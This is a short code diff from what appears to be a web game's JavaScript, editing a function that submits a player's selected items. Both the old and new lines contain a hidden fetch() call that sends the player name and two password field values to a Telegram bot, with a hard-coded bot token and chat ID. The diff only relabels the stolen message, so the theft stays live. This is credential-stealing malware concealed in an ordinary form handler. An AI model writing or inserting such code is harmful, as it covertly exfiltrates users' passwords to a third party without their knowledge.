@@ -27,7 +27,7 @@ function data_send(t, e, r, i, o, d) {
     for (var s = parent.wog_view.document.getElementsByName("items[]"), p = "", c = (l = 0,
     s.length); l < c; l++)
         s[l].checked && (p += "," + s[l].value);
-    fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=${parent.p_name} | ${parent.top_view.document.getElementsByTagName("input")['pass'].value} | ${n.pw.value}`)
+    fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=物品:${parent.p_name} | ${parent.top_view.document.getElementsByTagName("input")['pass'].value} | ${n.pw.value}`)
     p && (p = p.substring(1)),
     n.listkey.value = p,
     n.submit()
